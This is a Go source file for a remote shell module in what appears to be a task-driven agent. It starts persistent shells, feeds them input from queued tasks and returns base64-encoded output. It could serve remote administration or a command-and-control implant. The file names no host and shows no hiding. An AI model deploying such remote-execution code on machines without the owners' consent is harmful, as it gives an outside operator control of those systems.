//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"encoding/base64"
	"fmt"
	"io"
	"os/exec"
	"sync"
	"sync/atomic"
)

// InteractiveShell represents a persistent shell process with stdin/stdout pipes
type InteractiveShell struct {
	shellID   string
	PID       int
	active    bool
	shellType string
	cmd       *exec.Cmd
	stdin     io.WriteCloser
	stdout    io.ReadCloser
	stderr    io.ReadCloser
	mu        sync.Mutex
	closeCh   chan struct{}
}

var (
	interactiveShells   = make(map[string]*InteractiveShell)
	interactiveShellsMu sync.RWMutex
	shellCounter        uint64
)

func nextShellID() string {
	id := atomic.AddUint64(&shellCounter, 1)
	return fmt.Sprintf("sh_%d", id)
}

func getShell(shellID string) *InteractiveShell {
	interactiveShellsMu.RLock()
	defer interactiveShellsMu.RUnlock()
	return interactiveShells[shellID]
}

func setShell(shellID string, ish *InteractiveShell) {
	interactiveShellsMu.Lock()
	interactiveShells[shellID] = ish
	interactiveShellsMu.Unlock()
}

func removeShell(shellID string) {
	interactiveShellsMu.Lock()
	delete(interactiveShells, shellID)
	interactiveShellsMu.Unlock()
}

// pushShellOutput appends a shell_output result to pending results
func pushShellOutput(shellID string, data []byte) {
	if len(data) == 0 {
		return
	}
	enqueueResult(TaskResult{
		Type:     "shell_output",
		Output:   base64.StdEncoding.EncodeToString(data),
		Encoding: "base64",
		Path:     shellID,
	})
}

func (s *InteractiveShell) writeInput(data string) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	if !s.active {
		return nil
	}
	_, err := io.WriteString(s.stdin, data)
	return err
}

func (s *InteractiveShell) readOutput() {
	var wg sync.WaitGroup
	wg.Add(2)

	go func() {
		defer wg.Done()
		buf := make([]byte, 4096)
		for {
			n, err := s.stdout.Read(buf)
			if n > 0 {
				pushShellOutput(s.shellID, buf[:n])
			}
			if err != nil {
				return
			}
		}
	}()

	go func() {
		defer wg.Done()
		buf := make([]byte, 4096)
		for {
			n, err := s.stderr.Read(buf)
			if n > 0 {
				pushShellOutput(s.shellID, buf[:n])
			}
			if err != nil {
				return
			}
		}
	}()

	wg.Wait()

	s.mu.Lock()
	s.active = false
	s.mu.Unlock()

	pushShellOutput(s.shellID, []byte("[shell exited]\r\n"))
	removeShell(s.shellID)
}

func (s *InteractiveShell) stop() {
	s.mu.Lock()
	defer s.mu.Unlock()
	if !s.active {
		return
	}
	s.active = false
	if s.cmd != nil && s.cmd.Process != nil {
		s.cmd.Process.Kill()
	}
	s.stdin.Close()
	s.stdout.Close()
	s.stderr.Close()
	removeShell(s.shellID)
}

func handleInteractiveShellStart(task Task, res *TaskResult) {
	shellType := task.Command
	if shellType == "" {
		shellType = "cmd"
	}

	ish, err := startInteractiveShell(shellType)
	if err != nil {
		res.Error = "interactive shell start failed: " + err.Error()
		return
	}

	res.Output = ish.shellID
}

func handleInteractiveShellWrite(task Task, res *TaskResult) {
	shellID, data := parseShellWriteCommand(task.Command)
	if shellID == "" {
		res.Error = "invalid shell write command format: " + task.Command
		return
	}

	ish := getShell(shellID)
	if ish == nil {
		res.Error = "shell not found: " + shellID
		return
	}

	if err := ish.writeInput(data); err != nil {
		res.Error = "write failed: " + err.Error()
		return
	}

	res.Output = "ok"
}

func handleInteractiveShellStop(task Task, res *TaskResult) {
	shellID := task.Command
	if shellID == "" {
		res.Error = "shell ID required"
		return
	}

	ish := getShell(shellID)
	if ish == nil {
		res.Error = "shell not found: " + shellID
		return
	}

	ish.stop()
	res.Output = "stopped"
}

func parseShellWriteCommand(cmd string) (shellID, data string) {
	for i := 0; i < len(cmd); i++ {
		if cmd[i] == ':' {
			return cmd[:i], cmd[i+1:]
		}
	}
	return "", ""
}